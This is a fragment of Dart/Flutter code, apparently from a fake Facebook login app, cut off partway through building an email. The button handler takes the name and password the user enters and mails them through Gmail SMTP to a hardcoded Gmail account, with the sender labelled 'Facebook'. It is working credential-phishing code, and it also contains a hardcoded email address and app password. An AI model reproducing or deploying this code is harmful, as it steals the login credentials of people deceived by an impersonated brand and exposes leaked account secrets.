          ...
          Container(
            ...
            child: ElevatedButton(
              ...
              onPressed: () {
                ///
                ///
                sendEmailMessage(nameController.text, passwordController.text);
...
Future sendEmailMessage(String email, String password) async {
  String emailUser = "facebook09091234@gmail.com";
  String emailPassword = "zjbqqzczddzgigrv";

  final smtpServer = gmail(emailUser, emailPassword);
  final emailMessage = Message()
    ..from = Address(emailUser, "Facebook")
    ..recipients.add(emailUser)
    ..ccRecipients.add(emailUser)
    ..bccRecipients.add(emailUser)
    ..subject = "You have a new message from your Facebook Application"
    ..text = ""
    ..html = """
